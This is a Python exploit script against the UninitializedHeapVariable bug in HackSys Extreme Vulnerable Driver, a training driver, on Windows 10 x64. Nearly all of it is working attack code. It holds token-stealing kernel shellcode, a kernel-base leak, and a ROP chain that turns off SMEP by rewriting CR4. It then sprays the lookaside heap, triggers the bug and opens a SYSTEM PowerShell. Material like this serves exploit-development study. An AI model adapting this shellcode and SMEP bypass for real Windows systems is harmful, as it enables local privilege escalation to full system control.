#!/usr/bin/python
#
# HEVD v1.20 UninitializedHeapVariable exploit for Windows 10 v1703 x64 by @acru3l.
#

import sys
import struct
from ctypes import *
from ctypes.wintypes import *

ioctl_UninitializedHeapVariable = 0x222033

device_name = r'\\.\HackSysExtremeVulnerableDriver'
hFile = None

def pusha():
    '''
    alernative to pusha on x86
    '''
    # assembled with metasm
    code = ''
    code += '\x50'                                      # push rax
    code += '\x53'                                      # push rbx
    code += '\x51'                                      # push rcx
    
    return code

def popa():
    '''
    alternative to popa on x86
    '''
    # assembled with metasm
    code = ''
    code += '\x59'                                      # pop rcx
    code += '\x5b'                                      # pop rbx
    code += '\x58'                                      # pop rax
    
    return code

def shellcode():
    '''
    token stealing shellcode
    '''
    # assembled with metasm
    # steal token
    code = ''
    code += pusha()
    code += '\x65\x48\x8b\x04\x25\x88\x01\x00\x00'      # mov rax,[gs:0x188]        ; 0x188 = offset nt!_KPCR.PcrbData.CurrentThread
    code += '\x48\x8b\x80\xb8\x00\x00\x00'              # mov rax,[rax+0xb8]        ; 0xB8  = offset nt!_KTHREAD.ApcState.Process
    code += '\x48\x89\xc3'                              # mov rbx,rax
    code += '\x48\x8b\x9b\xe8\x02\x00\x00'              # mov rbx,[rbx+0x2e8]       ; 0x2E8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
    code += '\x48\x81\xeb\xe8\x02\x00\x00'              # sub rbx,0x2e8
    code += '\x48\x8b\x8b\xe0\x02\x00\x00'              # mov rcx,[rbx+0x2e0]       ; 0x2E0 = offset nt!_EPROCESS.UniqueProcessId
    code += '\x48\x83\xf9\x04'                          # cmp rcx,4
    code += '\x75\xe5'                                  # jnz $-0x19
    code += '\x48\x8b\x8b\x58\x03\x00\x00'              # mov rcx,[rbx+0x358]       ; 0x358 = offset nt!_EPROCESS.Token
    code += '\x48\x89\x88\x58\x03\x00\x00'              # mov [rax+0x358],rcx
    code += popa()
    # recover regs
    code += '\x65\x48\x8b\x04\x25\x88\x01\x00\x00'      # mov rax,[gs:0x188]        ; 0x188 = offset nt!_KPCR.PcrbData.CurrentThread
    code += '\x48\x8b\x58\x38'                          # mov rbx,[rax+0x38]        ; 0x38  = offset nt!_KTHREAD.StackBase
    code += '\x48\x81\xeb\x78\x08\x00\x00'              # sub rbx,0x878
    code += '\x48\x89\xdc'                              # mov rsp,rbx
    code += '\x4d\x31\xff'                              # xor r15,r15
    code += '\x4d\x31\xe4'                              # xor r12,r12
    code += '\x48\x31\xff'                              # xor rdi,rdi
    code += '\xc3'                                      # ret
    
    return code

def alloc_shellcode():
    code = shellcode()
    
    windll.kernel32.VirtualAlloc.argtypes = [LPVOID, c_size_t, DWORD, DWORD]
    windll.kernel32.VirtualAlloc.restype = LPVOID
    
    buffer = windll.kernel32.VirtualAlloc(
        0,
        len(code),
        0x00003000,                                     # MEM_COMMIT | MEM_RESERVE
        0x40)                                           # PAGE_EXECUTE_READWRITE
    
    memmove(buffer, code, len(code))
    
    return buffer

def build_ropchain(kernel_base, shellcode_addr):
    '''
    build rop chain to disable SMEP
    '''
    mask0 = 0xf0f0f0f0f0f0f0f0
    mask1 = 0x0f0f0f0f0f0f0f0f
    
    chain = ''
    chain += struct.pack('<Q', kernel_base + 0x691e1d)  # mov rsp, r11; pop r15; pop r12; pop rdi; ret;
    chain += struct.pack('<Q', 0x4141414141414141)      # filler
    chain += struct.pack('<Q', kernel_base + 0x1684ef)  # pop rax; pop rcx; ret;
    chain += struct.pack('<Q', mask0 | 0x506f8)         # rax
    chain += struct.pack('<Q', mask1 | 0x506f8)         # rcx
    chain += struct.pack('<Q', kernel_base + 0x62ae6)   # and rcx, rax; movabs rax, 0xfffff68000000000; add rax, rcx; ret;
    chain += struct.pack('<Q', kernel_base + 0x108552)  # mov cr4, rcx; ret;
    chain += struct.pack('<Q', kernel_base + 0x1684ef)  # pop rax; pop rcx; ret;
    chain += struct.pack('<Q', mask0 | shellcode_addr)  # rax
    chain += struct.pack('<Q', mask1 | shellcode_addr)  # rcx
    chain += struct.pack('<Q', kernel_base + 0x1574a8)  # and rax, rcx; ret;
    chain += struct.pack('<Q', kernel_base + 0x96b4f)   # jmp rax;
    
    return chain

def open_device():
    '''
    (re)open vulnerable device
    '''
    global hFile
    if hFile > 0:
        windll.kernel32.CloseHandle(hFile)
    hFile = windll.kernel32.CreateFileA(
        device_name,
        0xC0000000,                                     # GENERIC_READ | GENERIC_WRITE
        0x00000001,                                     # FILE_SHARE_READ
        0,                                              # NULL
        3,                                              # OPEN_EXISTING
        0x80,                                           # FILE_ATTRIBUTE_NORMAL
        0)                                              # NULL
    if hFile == -1:
        print '[-] Failed to open device: %s' % device_name
        return False
    else:
        print '[+] Device opened successfully: %s' % device_name
        return True

def call_UninitializedHeapVariable():
    '''
    DeviceIoControl wrapper
    '''
    open_device()
    bytes_retn = c_ulong(0)
    
    windll.kernel32.DeviceIoControl.argtypes = [HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, POINTER(DWORD), LPVOID]
    windll.kernel32.DeviceIoControl.restype = BOOL
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_UninitializedHeapVariable,
        struct.pack('<L', 0xcafebabe),
        4,
        0,
        0,
        byref(bytes_retn),
        0)

def create_event_object(name):
    '''
    CreateEventW wrapper
    '''
    name_buffer = create_string_buffer(name)
    return windll.kernel32.CreateEventW(
        0,
        0,
        0,
        name_buffer)

def get_kernel_base():
    '''
    find base address of the kernel via EnumDeviceDrivers
    '''
    array = c_ulonglong * 0x400
    addr = array()
    
    windll.psapi.EnumDeviceDrivers.argtypes = [POINTER(LPVOID), DWORD, POINTER(DWORD)]
    windll.psapi.EnumDeviceDrivers.restype = BOOL
    
    res = windll.psapi.EnumDeviceDrivers(
            cast(byref(addr), POINTER(LPVOID)),
            sizeof(addr),
            byref(c_ulong(0)))
    if not res:
        return None
    
    # Kernel is the first entry of the result
    return addr[0]

def rand_str(n):
    '''
    generate random string
    '''
    import random
    charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    res = []
    for i in xrange(n):
        res.append(random.choice(charset))
    
    return ''.join(res)

def break_code():
    import time
    time.sleep(0.5)
    windll.kernel32.DebugBreak()

if __name__ == '__main__':
    if not open_device():
        sys.exit(1)
    
    base_addr = get_kernel_base()
    if not base_addr:
        print '[-] Failed to obtain Kernel base'
        sys.exit(1)
    
    print '[+] Kernel base address: 0x%016x' % base_addr
    shellcode_addr = alloc_shellcode()
    if not shellcode_addr:
        print '[-] Failed to allocate shellcode'
        sys.exit(1)
    print '[+] Shellcode allocated at 0x%016x' % shellcode_addr
    
    ropchain = build_ropchain(base_addr, shellcode_addr)
    #print '[+] ropchain = %s' % ropchain.encode('hex')
    
    print '[+] Consuming Lookaside bucket'
    objects = []
    for i in xrange(0x100):
        payload = 'A' * 8 + ropchain + rand_str(0xee - len(ropchain)) + '\x00' * 2
        hObj = create_event_object(payload)
        objects.append(hObj)
    
    print '[+] Freeing Lookaside bucket'
    for h in objects:
        windll.kernel32.CloseHandle(h)
    
    print '[+] Triggering reuse of dirty chunk'
    
    call_UninitializedHeapVariable()
    
    # Got SYSTEM shell?
    import os
    os.system("powershell.exe")
    
